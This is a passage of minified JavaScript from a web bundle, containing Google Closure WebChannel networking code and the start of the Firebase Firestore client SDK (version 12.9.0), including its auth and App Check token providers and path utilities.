li(m,E){this.h=this.g=null,this.i=m||null,this.j=!!E}function Rt(m){m.g||(m.g=new Map,m.h=0,m.i&&os(m.i,function(E,T){m.add(decodeURIComponent(E.replace(/\+/g," ")),T)}))}a=li.prototype,a.add=function(m,E){Rt(this),this.i=null,m=ci(this,m);let T=this.g.get(m);return T||this.g.set(m,T=[]),T.push(E),this.h+=1,this};function wu(m,E){Rt(m),E=ci(m,E),m.g.has(E)&&(m.i=null,m.h-=m.g.get(E).length,m.g.delete(E))}function Il(m,E){return Rt(m),E=ci(m,E),m.g.has(E)}a.forEach=function(m,E){Rt(this),this.g.forEach(function(T,q){T.forEach(function($){m.call(E,$,q,this)},this)},this)};function Dl(m,E){Rt(m);let T=[];if(typeof E=="string")Il(m,E)&&(T=T.concat(m.g.get(ci(m,E))));else for(m=Array.from(m.g.values()),E=0;E<m.length;E++)T=T.concat(m[E]);return T}a.set=function(m,E){return Rt(this),this.i=null,m=ci(this,m),Il(this,m)&&(this.h-=this.g.get(m).length),this.g.set(m,[E]),this.h+=1,this},a.get=function(m,E){return m?(m=Dl(this,m),m.length>0?String(m[0]):E):E};function rs(m,E,T){wu(m,E),T.length>0&&(m.i=null,m.g.set(ci(m,E),A(T)),m.h+=T.length)}a.toString=function(){if(this.i)return this.i;if(!this.g)return"";const m=[],E=Array.from(this.g.keys());for(let q=0;q<E.length;q++){var T=E[q];const $=To(T);T=Dl(this,T);for(let te=0;te<T.length;te++){let be=$;T[te]!==""&&(be+="="+To(T[te])),m.push(be)}}return this.i=m.join("&")};function Mu(m){const E=new li;return E.i=m.i,m.g&&(E.g=new Map(m.g),E.h=m.h),E}function ci(m,E){return E=String(E),m.j&&(E=E.toLowerCase()),E}function ss(m,E){E&&!m.j&&(Rt(m),m.i=null,m.g.forEach(function(T,q){const $=q.toLowerCase();q!=$&&(wu(this,q),rs(this,$,T))},m)),m.j=E}function xn(m,E){const T=new Cn;if(c.Image){const q=new Image;q.onload=v(rn,T,"TestLoadImage: loaded",!0,E,q),q.onerror=v(rn,T,"TestLoadImage: error",!1,E,q),q.onabort=v(rn,T,"TestLoadImage: abort",!1,E,q),q.ontimeout=v(rn,T,"TestLoadImage: timeout",!1,E,q),c.setTimeout(function(){q.ontimeout&&q.ontimeout()},1e4),q.src=m}else E(!1)}function wl(m,E){const T=new Cn,q=new AbortController,$=setTimeout(()=>{q.abort(),rn(T,"TestPingServer: timeout",!1,E)},1e4);fetch(m,{signal:q.signal}).then(te=>{clearTimeout($),te.ok?rn(T,"TestPingServer: ok",!0,E):rn(T,"TestPingServer: server error",!1,E)}).catch(()=>{clearTimeout($),rn(T,"TestPingServer: error",!1,E)})}function rn(m,E,T,q,$){try{$&&($.onload=null,$.onerror=null,$.onabort=null,$.ontimeout=null),q(T)}catch{}}function ui(){this.g=new Se}function to(m){this.i=m.Sb||null,this.h=m.ab||!1}y(to,pa),to.prototype.g=function(){return new fr(this.i,this.h)};function fr(m,E){Fe.call(this),this.H=m,this.o=E,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.A=new Headers,this.h=null,this.F="GET",this.D="",this.g=!1,this.B=this.j=this.l=null,this.v=new AbortController}y(fr,Fe),a=fr.prototype,a.open=function(m,E){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.F=m,this.D=E,this.readyState=1,jn(this)},a.send=function(m){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");if(this.v.signal.aborted)throw this.abort(),Error("Request was aborted.");this.g=!0;const E={headers:this.A,method:this.F,credentials:this.m,cache:void 0,signal:this.v.signal};m&&(E.body=m),(this.H||c).fetch(new Request(this.D,E)).then(this.Pa.bind(this),this.ga.bind(this))},a.abort=function(){this.response=this.responseText="",this.A=new Headers,this.status=0,this.v.abort(),this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),this.readyState>=1&&this.g&&this.readyState!=4&&(this.g=!1,di(this)),this.readyState=0},a.Pa=function(m){if(this.g&&(this.l=m,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=m.headers,this.readyState=2,jn(this)),this.g&&(this.readyState=3,jn(this),this.g)))if(this.responseType==="arraybuffer")m.arrayBuffer().then(this.Na.bind(this),this.ga.bind(this));else if(typeof c.ReadableStream<"u"&&"body"in m){if(this.j=m.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.B=new TextDecoder;ls(this)}else m.text().then(this.Oa.bind(this),this.ga.bind(this))};function ls(m){m.j.read().then(m.Ma.bind(m)).catch(m.ga.bind(m))}a.Ma=function(m){if(this.g){if(this.o&&m.value)this.response.push(m.value);else if(!this.o){var E=m.value?m.value:new Uint8Array(0);(E=this.B.decode(E,{stream:!m.done}))&&(this.response=this.responseText+=E)}m.done?di(this):jn(this),this.readyState==3&&ls(this)}},a.Oa=function(m){this.g&&(this.response=this.responseText=m,di(this))},a.Na=function(m){this.g&&(this.response=m,di(this))},a.ga=function(){this.g&&di(this)};function di(m){m.readyState=4,m.l=null,m.j=null,m.B=null,jn(m)}a.setRequestHeader=function(m,E){this.A.append(m,E)},a.getResponseHeader=function(m){return this.h&&this.h.get(m.toLowerCase())||""},a.getAllResponseHeaders=function(){if(!this.h)return"";const m=[],E=this.h.entries();for(var T=E.next();!T.done;)T=T.value,m.push(T[0]+": "+T[1]),T=E.next();return m.join(`\r
`)};function jn(m){m.onreadystatechange&&m.onreadystatechange.call(m)}Object.defineProperty(fr.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(m){this.m=m?"include":"same-origin"}});function sn(m){let E="";return Me(m,function(T,q){E+=q,E+=":",E+=T,E+=`\r
`}),E}function hr(m,E,T){e:{for(q in T){var q=!1;break e}q=!0}q||(T=sn(T),typeof m=="string"?T!=null&&To(T):fa(m,E,T))}function ba(m){Fe.call(this),this.headers=new Map,this.L=m||null,this.h=!1,this.g=null,this.D="",this.o=0,this.l="",this.j=this.B=this.v=this.A=!1,this.m=null,this.F="",this.H=!1}y(ba,Fe);var no=/^https?$/i,Ml=["POST","PUT"];a=ba.prototype,a.Fa=function(m){this.H=m},a.ea=function(m,E,T,q){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+m);E=E?E.toUpperCase():"GET",this.D=m,this.l="",this.o=0,this.A=!1,this.h=!0,this.g=this.L?this.L.g():Al.g(),this.g.onreadystatechange=S(p(this.Ca,this));try{this.B=!0,this.g.open(E,String(m),!0),this.B=!1}catch(te){gr(this,te);return}if(m=T||"",T=new Map(this.headers),q)if(Object.getPrototypeOf(q)===Object.prototype)for(var $ in q)T.set($,q[$]);else if(typeof q.keys=="function"&&typeof q.get=="function")for(const te of q.keys())T.set(te,q.get(te));else throw Error("Unknown input type for opt_headers: "+String(q));q=Array.from(T.keys()).find(te=>te.toLowerCase()=="content-type"),$=c.FormData&&m instanceof c.FormData,!(Array.prototype.indexOf.call(Ml,E,void 0)>=0)||q||$||T.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[te,be]of T)this.g.setRequestHeader(te,be);this.F&&(this.g.responseType=this.F),"withCredentials"in this.g&&this.g.withCredentials!==this.H&&(this.g.withCredentials=this.H);try{this.m&&(clearTimeout(this.m),this.m=null),this.v=!0,this.g.send(m),this.v=!1}catch(te){gr(this,te)}};function gr(m,E){m.h=!1,m.g&&(m.j=!0,m.g.abort(),m.j=!1),m.l=E,m.o=5,_l(m),xo(m)}function _l(m){m.A||(m.A=!0,ia(m,"complete"),ia(m,"error"))}a.abort=function(m){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.o=m||7,ia(this,"complete"),ia(this,"abort"),xo(this))},a.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),xo(this,!0)),ba.Z.N.call(this)},a.Ca=function(){this.u||(this.B||this.v||this.j?br(this):this.Xa())},a.Xa=function(){br(this)};function br(m){if(m.h&&typeof l<"u"){if(m.v&&Pn(m)==4)setTimeout(m.Ca.bind(m),0);else if(ia(m,"readystatechange"),Pn(m)==4){m.h=!1;try{const te=m.ca();e:switch(te){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var E=!0;break e;default:E=!1}var T;if(!(T=E)){var q;if(q=te===0){let be=String(m.D).match(Lu)[1]||null;!be&&c.self&&c.self.location&&(be=c.self.location.protocol.slice(0,-1)),q=!no.test(be?be.toLowerCase():"")}T=q}if(T)ia(m,"complete"),ia(m,"success");else{m.o=6;try{var $=Pn(m)>2?m.g.statusText:""}catch{$=""}m.l=$+" ["+m.ca()+"]",_l(m)}}finally{xo(m)}}}}function xo(m,E){if(m.g){m.m&&(clearTimeout(m.m),m.m=null);const T=m.g;m.g=null,E||ia(m,"ready");try{T.onreadystatechange=null}catch{}}}a.isActive=function(){return!!this.g};function Pn(m){return m.g?m.g.readyState:0}a.ca=function(){try{return Pn(this)>2?this.g.status:-1}catch{return-1}},a.la=function(){try{return this.g?this.g.responseText:""}catch{return""}},a.La=function(m){if(this.g){var E=this.g.responseText;return m&&E.indexOf(m)==0&&(E=E.substring(m.length)),le(E)}};function rt(m){try{if(!m.g)return null;if("response"in m.g)return m.g.response;switch(m.F){case"":case"text":return m.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in m.g)return m.g.mozResponseArrayBuffer}return null}catch{return null}}function jo(m){const E={};m=(m.g&&Pn(m)>=2&&m.g.getAllResponseHeaders()||"").split(`\r
`);for(let q=0;q<m.length;q++){if(N(m[q]))continue;var T=Pu(m[q]);const $=T[0];if(T=T[1],typeof T!="string")continue;T=T.trim();const te=E[$]||[];E[$]=te,te.push(T)}U(E,function(q){return q.join(", ")})}a.ya=function(){return this.o},a.Ha=function(){return typeof this.l=="string"?this.l:String(this.l)};function oo(m,E,T){return T&&T.internalChannelParams&&T.internalChannelParams[m]||E}function pi(m){this.za=0,this.i=[],this.j=new Cn,this.ba=this.na=this.J=this.W=this.g=this.wa=this.G=this.H=this.u=this.U=this.o=null,this.Ya=this.V=0,this.Sa=oo("failFast",!1,m),this.F=this.C=this.v=this.m=this.l=null,this.X=!0,this.xa=this.K=-1,this.Y=this.A=this.D=0,this.Qa=oo("baseRetryDelayMs",5e3,m),this.Za=oo("retryDelaySeedMs",1e4,m),this.Ta=oo("forwardChannelMaxRetries",2,m),this.va=oo("forwardChannelRequestTimeoutMs",2e4,m),this.ma=m&&m.xmlHttpFactory||void 0,this.Ua=m&&m.Rb||void 0,this.Aa=m&&m.useFetchStreams||!1,this.O=void 0,this.L=m&&m.supportsCrossDomainXhr||!1,this.M="",this.h=new Tl(m&&m.concurrentRequestLimit),this.Ba=new ui,this.S=m&&m.fastHandshake||!1,this.R=m&&m.encodeInitMessageHeaders||!1,this.S&&this.R&&(this.R=!1),this.Ra=m&&m.Pb||!1,m&&m.ua&&this.j.ua(),m&&m.forceLongPolling&&(this.X=!1),this.aa=!this.S&&this.X&&m&&m.detectBufferingProxy||!1,this.ia=void 0,m&&m.longPollingTimeout&&m.longPollingTimeout>0&&(this.ia=m.longPollingTimeout),this.ta=void 0,this.T=0,this.P=!1,this.ja=this.B=null}a=pi.prototype,a.ka=8,a.I=1,a.connect=function(m,E,T,q){Ba(0),this.W=m,this.H=E||{},T&&q!==void 0&&(this.H.OSID=T,this.H.OAID=q),this.F=this.X,this.J=Bu(this,null,this.W),io(this)};function kl(m){if(cs(m),m.I==3){var E=m.V++,T=Ha(m.J);if(fa(T,"SID",m.M),fa(T,"RID",E),fa(T,"TYPE","terminate"),vr(m,T),E=new An(m,m.j,E),E.M=2,E.A=pr(Ha(T)),T=!1,c.navigator&&c.navigator.sendBeacon)try{T=c.navigator.sendBeacon(E.A.toString(),"")}catch{}!T&&c.Image&&(new Image().src=E.A,T=!0),T||(E.g=Vu(E.j,null),E.g.ea(E.A)),E.F=Date.now(),$n(E)}Uu(m)}function mi(m){m.g&&(Ol(m),m.g.cancel(),m.g=null)}function cs(m){mi(m),m.v&&(c.clearTimeout(m.v),m.v=null),ds(m),m.h.cancel(),m.m&&(typeof m.m=="number"&&c.clearTimeout(m.m),m.m=null)}function io(m){if(!xl(m.h)&&!m.m){m.m=!0;var E=m.Ea;ue||I(),Q||(ue(),Q=!0),w.add(E,m),m.D=0}}function us(m,E){return Zn(m.h)>=m.h.j-(m.m?1:0)?!1:m.m?(m.i=E.G.concat(m.i),!0):m.I==1||m.I==2||m.D>=(m.Sa?0:m.Ta)?!1:(m.m=Qn(p(m.Ea,m,E),zu(m,m.D)),m.D++,!0)}a.Ea=function(m){if(this.m)if(this.m=null,this.I==1){if(!m){this.V=Math.floor(Math.random()*1e5),m=this.V++;const $=new An(this,this.j,m);let te=this.o;if(this.U&&(te?(te=H(te),M(te,this.U)):te=this.U),this.u!==null||this.R||($.J=te,te=null),this.S)e:{for(var E=0,T=0;T<this.i.length;T++){a:{var q=this.i[T];if("__data__"in q.map&&(q=q.map.__data__,typeof q=="string")){q=q.length;break a}q=void 0}if(q===void 0)break;if(E+=q,E>4096){E=T;break e}if(E===4096||T===this.i.length-1){E=T+1;break e}}E=1e3}else E=1e3;E=_u(this,$,E),T=Ha(this.J),fa(T,"RID",m),fa(T,"CVER",22),this.G&&fa(T,"X-HTTP-Session-Id",this.G),vr(this,T),te&&(this.R?E="headers="+To(sn(te))+"&"+E:this.u&&hr(T,this.u,te)),jl(this.h,$),this.Ra&&fa(T,"TYPE","init"),this.S?(fa(T,"$req",E),fa(T,"SID","null"),$.U=!0,Kn($,T,null)):Kn($,T,E),this.I=2}}else this.I==3&&(m?Nl(this,m):this.i.length==0||xl(this.h)||Nl(this))};function Nl(m,E){var T;E?T=E.l:T=m.V++;const q=Ha(m.J);fa(q,"SID",m.M),fa(q,"RID",T),fa(q,"AID",m.K),vr(m,q),m.u&&m.o&&hr(q,m.u,m.o),T=new An(m,m.j,T,m.D+1),m.u===null&&(T.J=m.o),E&&(m.i=E.G.concat(m.i)),E=_u(m,T,1e3),T.H=Math.round(m.va*.5)+Math.round(m.va*.5*Math.random()),jl(m.h,T),Kn(T,q,E)}function vr(m,E){m.H&&Me(m.H,function(T,q){fa(E,q,T)}),m.l&&Me({},function(T,q){fa(E,q,T)})}function _u(m,E,T){T=Math.min(m.i.length,T);const q=m.l?p(m.l.Ka,m.l,m):null;e:{var $=m.i;let ze=-1;for(;;){const ka=["count="+T];ze==-1?T>0?(ze=$[0].g,ka.push("ofs="+ze)):ze=0:ka.push("ofs="+ze);let ua=!0;for(let Ra=0;Ra<T;Ra++){var te=$[Ra].g;const ln=$[Ra].map;if(te-=ze,te<0)ze=Math.max(0,$[Ra].g-100),ua=!1;else try{te="req"+te+"_"||"";try{var be=ln instanceof Map?ln:Object.entries(ln);for(const[so,qn]of be){let Rn=qn;d(qn)&&(Rn=fe(qn)),ka.push(te+so+"="+encodeURIComponent(Rn))}}catch(so){throw ka.push(te+"type="+encodeURIComponent("_badmap")),so}}catch{q&&q(ln)}}if(ua){be=ka.join("&");break e}}be=void 0}return m=m.i.splice(0,T),E.G=m,be}function ku(m){if(!m.g&&!m.v){m.Y=1;var E=m.Da;ue||I(),Q||(ue(),Q=!0),w.add(E,m),m.A=0}}function yr(m){return m.g||m.v||m.A>=3?!1:(m.Y++,m.v=Qn(p(m.Da,m),zu(m,m.A)),m.A++,!0)}a.Da=function(){if(this.v=null,Nu(this),this.aa&&!(this.P||this.g==null||this.T<=0)){var m=4*this.T;this.j.info("BP detection timer enabled: "+m),this.B=Qn(p(this.Wa,this),m)}},a.Wa=function(){this.B&&(this.B=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.P=!0,Ba(10),mi(this),Nu(this))};function Ol(m){m.B!=null&&(c.clearTimeout(m.B),m.B=null)}function Nu(m){m.g=new An(m,m.j,"rpc",m.Y),m.u===null&&(m.g.J=m.o),m.g.P=0;var E=Ha(m.na);fa(E,"RID","rpc"),fa(E,"SID",m.M),fa(E,"AID",m.K),fa(E,"CI",m.F?"0":"1"),!m.F&&m.ia&&fa(E,"TO",m.ia),fa(E,"TYPE","xmlhttp"),vr(m,E),m.u&&m.o&&hr(E,m.u,m.o),m.O&&(m.g.H=m.O);var T=m.g;m=m.ba,T.M=1,T.A=pr(Ha(E)),T.u=null,T.R=!0,ts(T,m)}a.Va=function(){this.C!=null&&(this.C=null,mi(this),yr(this),Ba(19))};function ds(m){m.C!=null&&(c.clearTimeout(m.C),m.C=null)}function Ou(m,E){var T=null;if(m.g==E){ds(m),Ol(m),m.g=null;var q=2}else if(eo(m.h,E))T=E.G,Pl(m.h,E),q=1;else return;if(m.I!=0){if(E.o)if(q==1){T=E.u?E.u.length:0,E=Date.now()-E.F;var $=m.D;q=gt(),ia(q,new Jn(q,T)),io(m)}else ku(m);else if($=E.m,$==3||$==0&&E.X>0||!(q==1&&us(m,E)||q==2&&yr(m)))switch(T&&T.length>0&&(E=m.h,E.i=E.i.concat(T)),$){case 1:ro(m,5);break;case 4:ro(m,10);break;case 3:ro(m,6);break;default:ro(m,2)}}}function zu(m,E){let T=m.Qa+Math.floor(Math.random()*m.Za);return m.isActive()||(T*=2),T*E}function ro(m,E){if(m.j.info("Error code "+E),E==2){var T=p(m.bb,m),q=m.Ua;const $=!q;q=new Vt(q||"//www.google.com/images/cleardot.gif"),c.location&&c.location.protocol=="http"||nt(q,"https"),pr(q),$?xn(q.toString(),T):wl(q.toString(),T)}else Ba(2);m.I=0,m.l&&m.l.pa(E),Uu(m),cs(m)}a.bb=function(m){m?(this.j.info("Successfully pinged google.com"),Ba(2)):(this.j.info("Failed to ping google.com"),Ba(1))};function Uu(m){if(m.I=0,m.ja=[],m.l){const E=ql(m.h);(E.length!=0||m.i.length!=0)&&(R(m.ja,E),R(m.ja,m.i),m.h.i.length=0,A(m.i),m.i.length=0),m.l.oa()}}function Bu(m,E,T){var q=T instanceof Vt?Ha(T):new Vt(T);if(q.g!="")E&&(q.g=E+"."+q.g),ri(q,q.u);else{var $=c.location;q=$.protocol,E=E?E+"."+$.hostname:$.hostname,$=+$.port;const te=new Vt(null);q&&nt(te,q),E&&(te.g=E),$&&ri(te,$),T&&(te.h=T),q=te}return T=m.G,E=m.wa,T&&E&&fa(q,T,E),fa(q,"VER",m.ka),vr(m,q),q}function Vu(m,E,T){if(E&&!m.L)throw Error("Can't create secondary domain capable XhrIo object.");return E=m.Aa&&!m.ma?new ba(new to({ab:T})):new ba(m.ma),E.Fa(m.L),E}a.isActive=function(){return!!this.l&&this.l.isActive(this)};function Fu(){}a=Fu.prototype,a.ra=function(){},a.qa=function(){},a.pa=function(){},a.oa=function(){},a.isActive=function(){return!0},a.Ka=function(){};function fi(){}fi.prototype.g=function(m,E){return new Tt(m,E)};function Tt(m,E){Fe.call(this),this.g=new pi(E),this.l=m,this.h=E&&E.messageUrlParams||null,m=E&&E.messageHeaders||null,E&&E.clientProtocolHeaderRequired&&(m?m["X-Client-Protocol"]="webchannel":m={"X-Client-Protocol":"webchannel"}),this.g.o=m,m=E&&E.initMessageHeaders||null,E&&E.messageContentType&&(m?m["X-WebChannel-Content-Type"]=E.messageContentType:m={"X-WebChannel-Content-Type":E.messageContentType}),E&&E.sa&&(m?m["X-WebChannel-Client-Profile"]=E.sa:m={"X-WebChannel-Client-Profile":E.sa}),this.g.U=m,(m=E&&E.Qb)&&!N(m)&&(this.g.u=m),this.A=E&&E.supportsCrossDomainXhr||!1,this.v=E&&E.sendRawJson||!1,(E=E&&E.httpSessionIdParam)&&!N(E)&&(this.g.G=E,m=this.h,m!==null&&E in m&&(m=this.h,E in m&&delete m[E])),this.j=new Po(this)}y(Tt,Fe),Tt.prototype.m=function(){this.g.l=this.j,this.A&&(this.g.L=!0),this.g.connect(this.l,this.h||void 0)},Tt.prototype.close=function(){kl(this.g)},Tt.prototype.o=function(m){var E=this.g;if(typeof m=="string"){var T={};T.__data__=m,m=T}else this.v&&(T={},T.__data__=fe(m),m=T);E.i.push(new Fa(E.Ya++,m)),E.I==3&&io(E)},Tt.prototype.N=function(){this.g.l=null,delete this.j,kl(this.g),delete this.g,Tt.Z.N.call(this)};function Hu(m){ra.call(this),m.__headers__&&(this.headers=m.__headers__,this.statusCode=m.__status__,delete m.__headers__,delete m.__status__);var E=m.__sm__;if(E){e:{for(const T in E){m=T;break e}m=void 0}(this.i=m)&&(m=this.i,E=E!==null&&m in E?E[m]:void 0),this.data=E}else this.data=m}y(Hu,ra);function Gu(){qa.call(this),this.status=1}y(Gu,qa);function Po(m){this.g=m}y(Po,Fu),Po.prototype.ra=function(){ia(this.g,"a")},Po.prototype.qa=function(m){ia(this.g,new Hu(m))},Po.prototype.pa=function(m){ia(this.g,new Gu)},Po.prototype.oa=function(){ia(this.g,"b")},fi.prototype.createWebChannel=fi.prototype.g,Tt.prototype.send=Tt.prototype.o,Tt.prototype.open=Tt.prototype.m,Tt.prototype.close=Tt.prototype.close,cT=function(){return new fi},lT=function(){return gt()},sT=He,gg={jb:0,mb:1,nb:2,Hb:3,Mb:4,Jb:5,Kb:6,Ib:7,Gb:8,Lb:9,PROXY:10,NOPROXY:11,Eb:12,Ab:13,Bb:14,zb:15,Cb:16,Db:17,fb:18,eb:19,gb:20},ur.NO_ERROR=0,ur.TIMEOUT=8,ur.HTTP_ERROR=6,up=ur,Cl.COMPLETE="complete",rT=Cl,Ta.EventType=ea,ea.OPEN="a",ea.CLOSE="b",ea.ERROR="c",ea.MESSAGE="d",Fe.prototype.listen=Fe.prototype.J,_c=Ta,ba.prototype.listenOnce=ba.prototype.K,ba.prototype.getLastError=ba.prototype.Ha,ba.prototype.getLastErrorCode=ba.prototype.ya,ba.prototype.getStatus=ba.prototype.ca,ba.prototype.getResponseJson=ba.prototype.La,ba.prototype.getResponseText=ba.prototype.la,ba.prototype.send=ba.prototype.ea,ba.prototype.setWithCredentials=ba.prototype.Fa,iT=ba}).apply(typeof Kd<"u"?Kd:typeof self<"u"?self:typeof window<"u"?window:{});class yt{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}yt.UNAUTHENTICATED=new yt(null),yt.GOOGLE_CREDENTIALS=new yt("google-credentials-uid"),yt.FIRST_PARTY=new yt("first-party-uid"),yt.MOCK_USER=new yt("mock-user");let dl="12.9.0";function kL(a){dl=a}const Gr=new ab("@firebase/firestore");function Hs(){return Gr.logLevel}function Ee(a,...e){if(Gr.logLevel<=$e.DEBUG){const t=e.map(ob);Gr.debug(`Firestore (${dl}): ${a}`,...t)}}function Zo(a,...e){if(Gr.logLevel<=$e.ERROR){const t=e.map(ob);Gr.error(`Firestore (${dl}): ${a}`,...t)}}function Jr(a,...e){if(Gr.logLevel<=$e.WARN){const t=e.map(ob);Gr.warn(`Firestore (${dl}): ${a}`,...t)}}function ob(a){if(typeof a=="string")return a;try{return(function(t){return JSON.stringify(t)})(a)}catch{return a}}function we(a,e,t){let o="Unexpected state";typeof e=="string"?o=e:t=e,uT(a,o,t)}function uT(a,e,t){let o=`FIRESTORE (${dl}) INTERNAL ASSERTION FAILED: ${e} (ID: ${a.toString(16)})`;if(t!==void 0)try{o+=" CONTEXT: "+JSON.stringify(t)}catch{o+=" CONTEXT: "+t}throw Zo(o),new Error(o)}function ma(a,e,t,o){let r="Unexpected state";typeof t=="string"?r=t:o=t,a||uT(e,r,o)}function Ne(a,e){return a}const de={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class xe extends ni{constructor(e,t){super(e,t),this.code=e,this.message=t,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}}class Qi{constructor(){this.promise=new Promise(((e,t)=>{this.resolve=e,this.reject=t}))}}class dT{constructor(e,t){this.user=t,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class NL{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,t){e.enqueueRetryable((()=>t(yt.UNAUTHENTICATED)))}shutdown(){}}class OL{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,t){this.changeListener=t,e.enqueueRetryable((()=>t(this.token.user)))}shutdown(){this.changeListener=null}}class zL{constructor(e){this.t=e,this.currentUser=yt.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,t){ma(this.o===void 0,42304);let o=this.i;const r=f=>this.i!==o?(o=this.i,t(f)):Promise.resolve();let l=new Qi;this.o=()=>{this.i++,this.currentUser=this.u(),l.resolve(),l=new Qi,e.enqueueRetryable((()=>r(this.currentUser)))};const c=()=>{const f=l;e.enqueueRetryable((async()=>{await f.promise,await r(this.currentUser)}))},d=f=>{Ee("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=f,this.o&&(this.auth.addAuthTokenListener(this.o),c())};this.t.onInit((f=>d(f))),setTimeout((()=>{if(!this.auth){const f=this.t.getImmediate({optional:!0});f?d(f):(Ee("FirebaseAuthCredentialsProvider","Auth not yet detected"),l.resolve(),l=new Qi)}}),0),c()}getToken(){const e=this.i,t=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(t).then((o=>this.i!==e?(Ee("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):o?(ma(typeof o.accessToken=="string",31837,{l:o}),new dT(o.accessToken,this.currentUser)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){const e=this.auth&&this.auth.getUid();return ma(e===null||typeof e=="string",2055,{h:e}),new yt(e)}}class UL{constructor(e,t,o){this.P=e,this.T=t,this.I=o,this.type="FirstParty",this.user=yt.FIRST_PARTY,this.R=new Map}A(){return this.I?this.I():null}get headers(){this.R.set("X-Goog-AuthUser",this.P);const e=this.A();return e&&this.R.set("Authorization",e),this.T&&this.R.set("X-Goog-Iam-Authorization-Token",this.T),this.R}}class BL{constructor(e,t,o){this.P=e,this.T=t,this.I=o}getToken(){return Promise.resolve(new UL(this.P,this.T,this.I))}start(e,t){e.enqueueRetryable((()=>t(yt.FIRST_PARTY)))}shutdown(){}invalidateToken(){}}class TC{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class VL{constructor(e,t){this.V=t,this.forceRefresh=!1,this.appCheck=null,this.m=null,this.p=null,Yt(e)&&e.settings.appCheckToken&&(this.p=e.settings.appCheckToken)}start(e,t){ma(this.o===void 0,3512);const o=l=>{l.error!=null&&Ee("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${l.error.message}`);const c=l.token!==this.m;return this.m=l.token,Ee("FirebaseAppCheckTokenProvider",`Received ${c?"new":"existing"} token.`),c?t(l.token):Promise.resolve()};this.o=l=>{e.enqueueRetryable((()=>o(l)))};const r=l=>{Ee("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=l,this.o&&this.appCheck.addTokenListener(this.o)};this.V.onInit((l=>r(l))),setTimeout((()=>{if(!this.appCheck){const l=this.V.getImmediate({optional:!0});l?r(l):Ee("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}}),0)}getToken(){if(this.p)return Promise.resolve(new TC(this.p));const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then((t=>t?(ma(typeof t.token=="string",44558,{tokenResult:t}),this.m=t.token,new TC(t.token)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}}function FL(a){const e=typeof self<"u"&&(self.crypto||self.msCrypto),t=new Uint8Array(a);if(e&&typeof e.getRandomValues=="function")e.getRandomValues(t);else for(let o=0;o<a;o++)t[o]=Math.floor(256*Math.random());return t}class ib{static newId(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=62*Math.floor(4.129032258064516);let o="";for(;o.length<20;){const r=FL(40);for(let l=0;l<r.length;++l)o.length<20&&r[l]<t&&(o+=e.charAt(r[l]%62))}return o}}function Ye(a,e){return a<e?-1:a>e?1:0}function bg(a,e){const t=Math.min(a.length,e.length);for(let o=0;o<t;o++){const r=a.charAt(o),l=e.charAt(o);if(r!==l)return Dh(r)===Dh(l)?Ye(r,l):Dh(r)?1:-1}return Ye(a.length,e.length)}const HL=55296,GL=57343;function Dh(a){const e=a.charCodeAt(0);return e>=HL&&e<=GL}function nl(a,e,t){return a.length===e.length&&a.every(((o,r)=>t(o,e[r])))}const xC="__name__";class ho{constructor(e,t,o){t===void 0?t=0:t>e.length&&we(637,{offset:t,range:e.length}),o===void 0?o=e.length-t:o>e.length-t&&we(1746,{length:o,range:e.length-t}),this.segments=e,this.offset=t,this.len=o}get length(){return this.len}isEqual(e){return ho.comparator(this,e)===0}child(e){const t=this.segments.slice(this.offset,this.limit());return e instanceof ho?e.forEach((o=>{t.push(o)})):t.push(e),this.construct(t)}limit(){return this.offset+this.length}popFirst(e){return e=e===void 